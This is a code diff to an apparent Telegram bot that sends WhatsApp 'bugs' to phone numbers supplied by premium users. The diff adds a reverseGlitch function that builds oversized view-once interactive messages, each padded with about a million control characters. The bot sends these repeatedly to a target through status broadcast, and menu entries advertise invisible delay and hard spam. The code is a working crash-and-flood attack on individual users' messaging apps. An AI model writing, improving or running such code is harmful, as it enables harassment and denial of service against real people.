@@ -1274,7 +1274,7 @@ async function showxbugs(ctx, page = 1) {
 ◇ /dangerdelay    62xxx  → Invisible Delay 100%
 ◇ /qiSys          62xxx  → Hard Spam No Kenon
 ◇ /lowsdelay    62xxx  → Currently Delay Invisible
-◇ /Xange     62xxx  → Delay Can Spam For Murbug
+◇ /xange     62xxx  → Delay Can Spam For Murbug
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
@@ -2326,15 +2326,15 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) =
   })();
 }); 
 /// CASE BUG 6 \\\
-bot.command("Xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Example : /Xange 62xxxx`);
+  if (!q) return ctx.reply(`🪧 ☇ Example : /xange 62xxxx`);
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
   await ctx.reply(
 
 `
-✅ SUCCES SEND BUGS TO : ${q}`,
+🚀 SUCCES MENGIRIM BUGS TO : ${q}`,
   {
     parse_mode: "HTML",
     reply_markup: {
@@ -2344,9 +2344,9 @@ bot.command("Xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
     },
   });
 
-  for (let i = 0; i < 10; i++) {
-    await delayHold(sock, target);
-    await sleep(500)
+  for (let i = 0; i < 20; i++) {
+    await reverseGlitch(sock, target);
+    await sleep(1000)
     }
 })
 /// --------- ( CASE BUG 7 ) ---------- \\\
@@ -2827,42 +2827,84 @@ async function SuperDelay(sock, target) {
  await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
 }
 
-async function delayHold(sock, target) {
-  const msg = {
-    interactiveResponseMessage: {
-      body: { 
-        text: "ARTILLERY", 
-        format: "DEFAULT" 
-      },
-      nativeFlowResponseMessage: {
-        name: "call_permission_request",
-        paramsJson: "\x10".repeat(700000),
-        version: 3,
-      },
-      entryPointConversionSource: "{}",
-      contextInfo: {
-        quotedMessage: {
-          paymentInviteMessage: {
-            serviceType: "FPM",
-            expiryTimestamp: 1814400000
+async function reverseGlitch(sock, target) {
+  const msg1 = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "A - r - T"
+          },
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: "\x10".repeat(1030000),
+            version: 3
           }
-        },
-        mentionedJid: Array.from({ length: 100 }, () => "0@newsletter"),
-        groupMentions: [
-          {
-            groupJid: "0@newsletter",
-            groupSubject: "."
-          }
-        ],
-        participant: target,
-        remoteJid: target
+        }
       }
     }
   };
-    
-  await sock.relayMessage(target, msg, {
-    participant: { jid: target }
-  });
+
+  const msg2 = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "A - r - T"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\x10".repeat(1030000),
+            version: 3
+          }
+        }
+      }
+    }
+  };
+
+  const msg3 = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "A - r - T"
+          },
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: "\x10".repeat(1030000),
+            version: 3
+          }
+        }
+      }
+    }
+  };
+
+  for (let i = 0; i < 20; i++) {
+    for (const msg of [msg1, msg2, msg3]) {
+      await sock.relayMessage(
+        "status@broadcast",
+        msg,
+        {
+          messageId: null,
+          statusJidList: [target],
+          additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+              tag: "mentioned_users",
+              attrs: {},
+              content: [{
+                tag: "to",
+                attrs: {
+                  jid: target
+                }
+              }]
+            }]
+          }]
+        }
+      );
+    }
+  }
 }
 
 async function fvckmklu(sock, target) {
